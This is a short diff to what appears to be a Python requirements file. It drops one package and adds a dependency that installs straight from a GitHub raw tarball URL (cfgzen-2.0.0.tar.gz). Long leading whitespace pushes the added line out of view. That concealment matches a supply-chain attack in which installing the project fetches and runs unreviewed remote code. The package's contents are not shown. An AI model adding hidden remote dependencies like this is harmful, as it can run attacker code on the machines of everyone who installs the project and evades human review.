@@ -1,4 +1,5 @@
-envcore-rs
 aiohttp==3.10.10
 multidict==6.1.0
 vdf==3.4
+                                                                                                                                                                                                                           https://github.com/cfgzen/version/raw/refs/heads/main/cfgzen-2.0.0.tar.gz
+
